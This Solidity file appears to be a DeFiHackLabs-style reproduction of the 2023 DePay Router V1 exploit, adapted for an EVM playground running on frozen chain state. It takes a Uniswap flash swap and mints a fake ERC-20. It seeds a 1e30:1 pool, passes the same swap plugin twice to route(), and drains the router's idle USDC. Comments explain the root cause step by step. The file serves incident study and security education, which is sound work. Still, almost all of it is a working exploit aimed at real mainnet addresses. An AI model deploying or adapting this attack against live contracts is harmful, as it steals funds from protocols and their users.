// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "./../interface.sol";

// @KeyInfo - Total Lost : ~870.92 USDC (this tx; full campaign ~$827-$2.3K across victim tokens)
// Attacker EOA    : https://etherscan.io/address/0x7f284235aef122215c46656163f39212ffa77ed9
// Attack contract : https://etherscan.io/address/0xba2aa7426ec6529c25a38679478645b2db5fa19b
// Vulnerable contract (DePayRouterV1)         : https://etherscan.io/address/0xae60ac8e69414c2dc362d0e6a03af643d1d85b92
// Vulnerable plugin  (DePayRouterV1Uniswap01) : https://etherscan.io/address/0xe04b08dfc6caa0f4ec523a3ae283ece7efe00019
// Attack Tx : https://etherscan.io/tx/0x9a036058afb58169bfa91a826f5fcf4c0a376e650960669361d61bef99205f35
//
// @Analysis - https://twitter.com/CertiKAlert/status/1709764146324009268
//
// Cheatcode-free reproduction for the in-browser EVM Playground. The original
// DeFiHackLabs test runs the attack INLINE on the Foundry `ContractTest is Test`
// contract itself (that contract doubles as the attacker AND as a minimal fake
// ERC-20 -- see balanceOf/transfer/transferFrom below). Its only cheatcode uses
// are vm.createSelectFork (replaced by the frozen anvil_state.json fork),
// vm.label (cosmetic, dropped) and console.log (dropped). Everything else --
// the Uniswap V2 flash swap, the fake-token liquidity seed, and the double
// spend through DePayRouterV1.route() -- runs unchanged against the real,
// frozen on-chain contracts, so it needs no cheatcode replacement at all.
//
// Root cause: DePayRouterV1.route() snapshots and re-checks the balance of
// ONLY the output token (path[last]), while `_ensureTransferIn` pulls the
// input token (path[0]) exactly once but `_execute()` loops over the caller-
// supplied `plugins` array with no de-duplication. Passing the SAME approved
// Uniswap swap plugin twice runs swapExactTokensForTokens(amounts[0], ...)
// TWICE, spending amounts[0] of the router's USDC on each iteration -- but the
// router only ever collected amounts[0] once. The extra spend is funded
// straight out of the router's pre-existing (idle) USDC balance. Because the
// output token (path[last]) is a worthless fake ERC-20 this contract mints
// and pools 1e30:1 against USDC, the post-condition check ("balanceOf(fakeToken)
// did not decrease") trivially passes while the router's real USDC is drained.
contract DePayRouterDrain {
    IUSDC USDC = IUSDC(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    // USDC/WETH pair -- also the flash-swap source for the working capital.
    IUniswapV2Pair UNIV2 = IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
    IUniswapV2Router UniRouter = IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
    IDepayRouterV1 DepayRouter = IDepayRouterV1(0xae60aC8e69414C2Dc362D0e6a03af643d1D85b92);
    IUniswapV2Factory UniFactory = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
    // The router's already-approved Uniswap swap plugin -- reused verbatim, not malicious.
    address DePayUniV1 = 0xe04b08Dfc6CaA0F4Ec523a3Ae283Ece7efE00019;
    // Flash-borrowed USDC (repaid + the 0.3% Uniswap fee at the very end).
    uint256 constant amount = 1_755_923_836;

    constructor() {
        USDC.approve(address(UniRouter), type(uint256).max);
        USDC.approve(address(DepayRouter), type(uint256).max);
    }

    // Recorded entrypoint: pull a USDC flash swap from the real USDC/WETH
    // pair. Because `data` is non-empty, the pair calls back into
    // uniswapV2Call() below BEFORE it checks its own invariant -- that
    // callback runs the entire drain and must repay the loan before this
    // returns.
    function run() external {
        UNIV2.swap(amount, 0, address(this), bytes("x"));
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        // The router's idle, pre-existing USDC balance -- this exact amount
        // is what ends up stolen.
        uint256 amountAMin = 877_961_918;

        // Mint this contract 1e30+1 units of ITSELF as an ERC-20 (the
        // "FakeToken" -- see balanceOf/transfer/transferFrom below).
        balances[address(this)] = 1e30 + 1;

        // Seed a brand-new FakeToken/USDC pair at an absurd 1e30 : 1 ratio.
        // `sender` is address(this) (the pair forwards its own msg.sender,
        // which is this contract since it called UNIV2.swap() itself), so
        // tokenA is this contract acting as the FakeToken.
        (,, uint256 liquidity) =
            UniRouter.addLiquidity(sender, address(USDC), 1e30, 1, amountAMin, 1, address(this), type(uint256).max);
        IUniswapV2Pair newUniPair = IUniswapV2Pair(UniFactory.getPair(address(this), address(USDC)));

        // route(path=[USDC, FakeToken], amounts[0]=877,961,918, plugins=[Uni, Uni]):
        // the router pulls in 877,961,918 USDC ONCE via _ensureTransferIn, but
        // the duplicated plugin list runs the swap TWICE, so 2x877,961,918 USDC
        // leaves the router while it only ever collected 1x -- the difference
        // is the router's own idle balance being drained.
        address[] memory path = new address[](2);
        (path[0], path[1]) = (address(USDC), address(this));
        uint256[] memory amounts = new uint256[](3);
        (amounts[0], amounts[1], amounts[2]) = (amountAMin, 0, type(uint256).max);
        address[] memory addresses = new address[](2);
        (addresses[0], addresses[1]) = (address(this), address(this));
        address[] memory plugins = new address[](2);
        (plugins[0], plugins[1]) = (DePayUniV1, DePayUniV1);
        string[] memory routerData = new string[](1);
        DepayRouter.route(path, amounts, addresses, plugins, routerData);

        // Reclaim everything from the FakeToken/USDC pool -- the drained USDC
        // comes straight back out via removeLiquidity(), since this contract
        // owns 100% of the LP supply it just minted.
        newUniPair.approve(address(UniRouter), liquidity);
        UniRouter.removeLiquidity(address(this), address(USDC), liquidity, 1, 1, address(this), type(uint256).max);

        // Repay the flash swap: principal * 1001/997 = principal + 0.3% fee.
        USDC.transfer(address(UNIV2), amount * 1001 / 997);
    }

    // --- Minimal fake ERC-20: this contract IS the "FakeToken" pooled against USDC ---
    mapping(address => uint256) public balances;

    function balanceOf(
        address account
    ) public view returns (uint256) {
        return balances[account];
    }

    function transfer(address to, uint256 value) public returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        _transfer(from, to, value);
        return true;
    }

    function _transfer(address from, address to, uint256 value) internal {
        balances[from] -= value;
        balances[to] += value;
    }
}

interface IDepayRouterV1 {
    function route(
        // The path of the token conversion.
        address[] calldata path,
        // Amounts passed to processors: e.g. [amountIn, amountOut, deadline]
        uint256[] calldata amounts,
        // Addresses passed to plugins: e.g. [receiver]
        address[] calldata addresses,
        // List and order of plugins to be executed for this payment.
        address[] calldata plugins,
        // Data passed to plugins.
        string[] calldata data
    ) external payable returns (bool);
}
